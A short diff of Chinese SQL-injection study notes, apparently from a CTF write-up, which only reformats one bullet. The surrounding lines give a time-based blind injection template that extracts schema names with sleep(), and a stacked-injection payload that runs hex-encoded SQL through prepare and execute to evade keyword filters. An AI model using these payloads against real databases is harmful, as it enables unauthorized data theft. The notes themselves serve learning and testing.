@@ -75,7 +75,7 @@ for i in range(1,50):
     - table、and、or
 - 时间盲注需要用到sleep(n)，盲注通用语句
     - `sql="select(if(ascii(mid((select group_concat(schema_name) from information_schema.schemata),{},1))={},sleep(3),0))".format(str(num), str(ord(char)))`
-进一步的关键字都被过滤，时间盲注关键字也无效，考虑SQL语句的转码。使用**堆叠注入**的方式执行**16进制编码的SQL语句**。
+- 进一步的关键字都被过滤，时间盲注关键字也无效，考虑SQL语句的转码。使用**堆叠注入**的方式执行**16进制编码的SQL语句**。
 通用payload如下
     - `1';set @x=16进制SQL语句;prepare a from @x;execute a;#`
     - 注意`16进制SQL语句`前面需要加`0x`
